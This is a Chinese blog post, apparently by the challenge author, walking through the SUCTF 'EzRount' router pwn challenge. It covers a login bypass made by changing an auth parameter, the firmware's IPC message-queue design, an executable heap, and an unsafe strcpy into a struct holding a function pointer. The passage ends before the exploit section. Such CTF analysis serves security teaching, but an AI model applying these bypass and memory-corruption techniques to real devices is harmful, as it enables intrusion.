@@ -1,0 +1,820 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+    
+      data-theme-mode="auto"
+    
+  >
+  <head>
+  
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_0khxww3tj3q9';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":100,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://Khighl.github.io.git';</script>
+  
+  <title>
+    EzRount |
+    
+    Hexo
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+  
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_0khxww3tj3q9.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="SUCTF-EzRount本来想整个大的, 但无奈水平有限只能尽力做到这个程度 QwQ 本来想设计一个以IPC为主的后端模式, 需要攻击者将cgi与mainproc中的功能通过猜测联系在一起  前端越权通过抓包登录的报文, 我们可以发现如果先是随便输入一对账密 会抓到一个发向http的包 12345678910GET &#x2F;www&#x2F;http?auth&#x3D;0&amp;action&#x3D;login HTTP&#x2F;1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="EzRount">
+<meta property="og:url" content="https://khighl.github.io.git/2026/03/17/Ez_Rounter/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="SUCTF-EzRount本来想整个大的, 但无奈水平有限只能尽力做到这个程度 QwQ 本来想设计一个以IPC为主的后端模式, 需要攻击者将cgi与mainproc中的功能通过猜测联系在一起  前端越权通过抓包登录的报文, 我们可以发现如果先是随便输入一对账密 会抓到一个发向http的包 12345678910GET &#x2F;www&#x2F;http?auth&#x3D;0&amp;action&#x3D;login HTTP&#x2F;1">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://khighl.github.io.git/image-20260317140419180.png">
+<meta property="og:image" content="https://khighl.github.io.git/image-20260317141237169.png">
+<meta property="og:image" content="https://khighl.github.io.git/image-20260317150506445.png">
+<meta property="article:published_time" content="2026-03-16T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-03-17T07:19:52.195Z">
+<meta property="article:author" content="zer00ne">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="SUCTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://khighl.github.io.git/image-20260317140419180.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+  
+</div>
+<header id="header">
+  
+    
+      
+        <picture>
+          
+        </picture>
+        
+          <img  fetchpriority="high" src="/images/banner.webp" alt="EzRount">
+        
+      
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">EzRount</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        
+          <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SUCTF-EzRount"><span class="toc-number">1.</span> <span class="toc-text">SUCTF-EzRount</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%AB%AF%E8%B6%8A%E6%9D%83"><span class="toc-number">1.1.</span> <span class="toc-text">前端越权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">二进制分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90"><span class="toc-number">1.2.1.</span> <span class="toc-text">架构分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91"><span class="toc-number">1.2.2.</span> <span class="toc-text">业务逻辑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mainproc"><span class="toc-number">1.2.3.</span> <span class="toc-text">mainproc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">1.3.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="zer00ne" class="lazyload">
+  <div class="sidebar-author-name">zer00ne</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">24</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">9</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+        
+      
+      
+        
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+        
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+  
+</aside>
+
+          <section id="main"><article id="post-Ez_Rounter" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link" data-aos="zoom-in">
+    <time datetime="2026-03-16T16:00:00.000Z" itemprop="datePublished">2026-03-17</time>
+    <time style="display: none;" id="post-update-time">2026-03-17</time>
+  </span>
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="SUCTF-EzRount"><a href="#SUCTF-EzRount" class="headerlink" title="SUCTF-EzRount"></a>SUCTF-EzRount</h1><p>本来想整个大的, 但无奈水平有限只能尽力做到这个程度 <em>QwQ</em></p>
+<p>本来想设计一个以IPC为主的后端模式, 需要攻击者将cgi与mainproc中的功能通过猜测联系在一起 </p>
+<h2 id="前端越权"><a href="#前端越权" class="headerlink" title="前端越权"></a>前端越权</h2><p>通过抓包登录的报文, 我们可以发现如果先是随便输入一对账密</p>
+<p>会抓到一个发向http的包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /www/http?auth=0&amp;action=login HTTP/1.1</span><br><span class="line">Host: 192.168.41.128:8080</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://192.168.41.128:8080/index.html</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure>
+
+<p>可以看到有一个参数auth&#x3D;0</p>
+<p>此时如果放行报文就会登录失败, 但是将auth的值改成1就可以登录成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /control.html HTTP/1.1</span><br><span class="line">Host: 192.168.41.128:8080</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://192.168.41.128:8080/index.html</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Cookie: session_id=72cb56e041a043ee6dfc3427033ef203</span><br><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure>
+
+<h2 id="二进制分析"><a href="#二进制分析" class="headerlink" title="二进制分析"></a>二进制分析</h2><h3 id="架构分析"><a href="#架构分析" class="headerlink" title="架构分析"></a>架构分析</h3><p>首先可以来到<code>固件与备份</code>, 将这个项目下载得到二进制文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">├── http</span><br><span class="line">├── lib</span><br><span class="line">│   └── libutils.so</span><br><span class="line">├── mainproc</span><br><span class="line">├── start.sh</span><br><span class="line">├── tmp</span><br><span class="line">│   └── sessions</span><br><span class="line">└── www</span><br><span class="line">    ├── cgi-bin</span><br><span class="line">    │   ├── download.cgi</span><br><span class="line">    │   ├── list.cgi</span><br><span class="line">    │   ├── login.cgi</span><br><span class="line">    │   ├── ping.cgi</span><br><span class="line">    │   ├── restart.sh</span><br><span class="line">    │   ├── vpn.cgi</span><br><span class="line">    │   └── wifi.cgi</span><br><span class="line">    ├── control.html</span><br><span class="line">    ├── css</span><br><span class="line">    │   ├── dashboard.css</span><br><span class="line">    │   ├── fontawesome</span><br><span class="line">    │   │   └── css</span><br><span class="line">    │   │       └── all.min.css</span><br><span class="line">    │   └── fonts</span><br><span class="line">    │       ├── inter.css</span><br><span class="line">    │       └── Inter-Regular.woff2</span><br><span class="line">    ├── index.html</span><br><span class="line">    └── js</span><br><span class="line">        └── dashboard.js</span><br></pre></td></tr></table></figure>
+
+<p>首先可以分析得到请求的传输流程<code>html -&gt; /cgi-bin/*.cgi</code></p>
+<p>对http进行分析, 可以发现这个文件:</p>
+<ol>
+<li>将请求转发给<code>/cgi-bin/*.cgi</code></li>
+<li>处理静态资源, 并对除了login.html的静态资源进行鉴权</li>
+<li>接收<code>login.cgi</code>的重定向请求, 并为<code>auth=1</code>的会话设置cookie</li>
+</ol>
+<p>接下来我们可以结合html页面和<code>cgi</code>综合分析每个业务逻辑的链路</p>
+<h3 id="业务逻辑"><a href="#业务逻辑" class="headerlink" title="业务逻辑"></a>业务逻辑</h3><p><img src="/./image-20260317140419180.png" alt="image-20260317140419180"></p>
+<p>除了重启按钮以外, 几乎每一个接口都有对应的cgi</p>
+<p>我们用IDA打开可以发现, 每一个cgi的结尾几乎都有一个函数<code>CFG_SET</code></p>
+<p>而且没有对这些报文的具体处理, 这就涉及到一个在iot中重要的概念 : <strong>IPC(进程间通信)</strong></p>
+<p>以下给出源码, 位于<code>libutils.so</code>中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">int CFG_SET(long type_id, const void *data, size_t len) &#123;</span><br><span class="line">    if (type_id &lt;= 0 || len &gt; 4096) return -1;</span><br><span class="line">    int msgid = msgget(IPC_KEY_CGI_TO_MAIN, 0666 | IPC_CREAT);</span><br><span class="line">    if (msgid == -1) return -1;</span><br><span class="line">    struct router_msgbuf msg;</span><br><span class="line">    memset(&amp;msg, 0, sizeof(msg));</span><br><span class="line">    msg.mtype = type_id; </span><br><span class="line">    msg.data_len = len;</span><br><span class="line">    if (data &amp;&amp; len &gt; 0) memcpy(msg.payload, data, len);</span><br><span class="line">    return msgsnd(msgid, &amp;msg, sizeof(struct router_msgbuf) - sizeof(long), 0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int CFG_GET(long type_id, void *out_data, size_t max_len) &#123;</span><br><span class="line">    if (!out_data) return -1;</span><br><span class="line">    int msgid = msgget(IPC_KEY_CGI_TO_MAIN, 0666 | IPC_CREAT);</span><br><span class="line">    if (msgid == -1) return -1;</span><br><span class="line">    if (type_id == 0 &amp;&amp; max_len &gt;= sizeof(struct router_msgbuf)) &#123;</span><br><span class="line">        return msgrcv(msgid, out_data, sizeof(struct router_msgbuf) - sizeof(long), 0, 0);</span><br><span class="line">    &#125;</span><br><span class="line">    struct router_msgbuf msg;</span><br><span class="line">    if (msgrcv(msgid, &amp;msg, sizeof(struct router_msgbuf) - sizeof(long), type_id, 0) == -1) return -1;</span><br><span class="line">    size_t copy_len = (msg.data_len &gt; max_len) ? max_len : msg.data_len;</span><br><span class="line">    memcpy(out_data, msg.payload, copy_len);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到<code>SET</code>函数用于将数据流投入内核中的消息队列</p>
+<p>对应的, <code>GET</code>函数负责将内容从消息队列中取出放入当前进程的内存中</p>
+<p><strong>综合以上结论我们可以得出 : 整个环境中必然存在一个实现GET功能的进程</strong></p>
+<p>我们可以从两个方向找到这个文件</p>
+<p><img src="/./image-20260317141237169.png" alt="image-20260317141237169"></p>
+<p>可以发现一个奇怪的二进制文件<code>mainproc</code>,大概可以猜到这就是负责GET的文件</p>
+<p>或者直接从docker启动脚本中发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line"># Ensure sessions directory exists</span><br><span class="line">mkdir -p /app/tmp/sessions</span><br><span class="line"></span><br><span class="line"># Start the main backend process in the background</span><br><span class="line">echo &quot;Starting mainproc...&quot;</span><br><span class="line">./mainproc &amp;</span><br><span class="line"></span><br><span class="line"># Give mainproc a moment to initialize (e.g., set up message queues)</span><br><span class="line">sleep 2</span><br><span class="line"></span><br><span class="line"># Start the Web Server in the foreground on port 80</span><br><span class="line">echo &quot;Starting http server on port 80...&quot;</span><br><span class="line">./http 80</span><br></pre></td></tr></table></figure>
+
+<p>起docker的时候顺手将<code>mainproc</code>拉起放置在后台</p>
+<h3 id="mainproc"><a href="#mainproc" class="headerlink" title="mainproc"></a>mainproc</h3><p>现在就该重点分析mainproc了</p>
+<p>首先可以发现这个文件中的<code>init_array</code>存在一个函数指针</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__attribute__((constructor)) void Init() &#123;</span><br><span class="line">    void *ptr = malloc(0xf000);</span><br><span class="line">    void *heap_current = sbrk(0);</span><br><span class="line">    uintptr_t page_align_mask = ~((uintptr_t)0xFFF);</span><br><span class="line">    void *heap_base = (void *)((uintptr_t)ptr &amp; page_align_mask);</span><br><span class="line">    mprotect(heap_base, 0x21000, PROT_READ | PROT_WRITE | PROT_EXEC);</span><br><span class="line">    free(ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>获取了堆的基地址, 并为其添加了<strong>x</strong>(可执行权限)&lt;本意是想模拟iot固件中总是不开NX保护导致堆可执行, 但感觉有点刻意了:_(   &gt; </p>
+<p>在main函数可以发现在不停监听消息队列, 只要消息队列中有内容便投入<code>dispatch_action</code>中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">int main(int argc, char *argv[]) &#123;</span><br><span class="line">    if (argc &gt; 1 &amp;&amp; strcmp(argv[1], &quot;-d&quot;) == 0) &#123;</span><br><span class="line">        if (daemon(1, 0) &lt; 0) &#123;</span><br><span class="line">            perror(&quot;daemon&quot;);</span><br><span class="line">            exit(1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    setvbuf(stdout, NULL, _IONBF, 0);</span><br><span class="line">    setvbuf(stderr, NULL, _IONBF, 0);</span><br><span class="line">    struct router_msgbuf msg;</span><br><span class="line">    while (1) &#123;</span><br><span class="line">        memset(&amp;msg, 0, sizeof(msg))</span><br><span class="line">        if (CFG_GET(0, &amp;msg, sizeof(msg)) == -1) &#123;</span><br><span class="line">            usleep(100000); </span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        dispatch_action(&amp;msg);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接着在dispatch_action函数中可以发现一个巨大的<code>switch-case</code>结构(IDA的反编译会变成if-else结构)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">switch (msg-&gt;mtype) &#123;</span><br><span class="line">    case 0x6374fe30: </span><br><span class="line">        Set_WIFI(msg);</span><br><span class="line">        break;</span><br><span class="line">    case 0x74122f00:  </span><br><span class="line">    case 0x74122c02:  </span><br><span class="line">        Add_MAC(msg);</span><br><span class="line">        break;</span><br><span class="line">    case 0x32ee2000:  </span><br><span class="line">    case 0x32ef2030:  </span><br><span class="line">        Del_MAC(msg);</span><br><span class="line">        break;</span><br><span class="line">    case 0x9313f7e0: </span><br><span class="line">        Set_VPN(msg);</span><br><span class="line">        break;</span><br><span class="line">    case 0xe6133f10: </span><br><span class="line">        Edit_VPN_Custom(msg);</span><br><span class="line">        break;</span><br><span class="line">    case 0x96e7ff60:  </span><br><span class="line">        Apply_VPN();</span><br><span class="line">        break;</span><br><span class="line">    default:</span><br><span class="line">        printf(&quot;[WARN] Received unknown message type: 0x%lx\n&quot;, msg-&gt;mtype);</span><br><span class="line">        break;</span><br></pre></td></tr></table></figure>
+
+<p>根据不同的魔数, 调用不同功能的函数, 从cgi中提取不同的功能可以整理出接口与处理函数的对应关系(其实从名字就能看出来)</p>
+<p>接下来应该梳理不同结构体, 结构体从IDA静态分析不是很容易, 推荐通过gdb调试描绘结构体轮廓</p>
+<p>**黑白名单 : **</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct __attribute__((packed)) mac_req &#123; </span><br><span class="line">    int idx; </span><br><span class="line">    char mac[0x10];     </span><br><span class="line">    char note[0x1c];    </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>**wifi设置 : **</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct wifi_req &#123;</span><br><span class="line">    char ssid[0x40];</span><br><span class="line">    char password[0x40];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>这两种结构体只会在堆上创建两种不同大小的堆块, 没有具体的作用</p>
+<p>**vpn : **</p>
+<p>在vpn.cgi中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">struct __attribute__((packed)) vpn_recv &#123;</span><br><span class="line">        char action[0x20];</span><br><span class="line">        char name[0x20];</span><br><span class="line">        char proto[0x20];</span><br><span class="line">        char server[0x30];</span><br><span class="line">        char user[0x20];</span><br><span class="line">        char pass[0x20];</span><br><span class="line">        char cert[8];</span><br><span class="line">        char gap[1];    </span><br><span class="line">        char custom[3000];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>在mainproc中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">struct vpn_config_req &#123;</span><br><span class="line">    uint16_t custom_len;</span><br><span class="line">    char _pad[6];</span><br><span class="line">    char cert[8];</span><br><span class="line">    void (*apply_cb)(struct vpn_config_req *);</span><br><span class="line">    char action[0x20];</span><br><span class="line">    char name[0x20];</span><br><span class="line">    char proto[0x20];</span><br><span class="line">    char server[0x30];</span><br><span class="line">    char user[0x20];</span><br><span class="line">    char pass[0x20]; </span><br><span class="line">    char *custom_ptr;    </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>可以发现vpn结构体在两个进程中的结构差异很大, 且在mainproc中存在函数和内存两种指针</p>
+<p><strong>不同的处理函数的逻辑很简单</strong>, 包括vpn也是, 从cgi结构体中将同名成员复制到mainproc结构体中</p>
+<p>但是注意, 这里使用了<strong>不安全的strcpy</strong>且没有做保护</p>
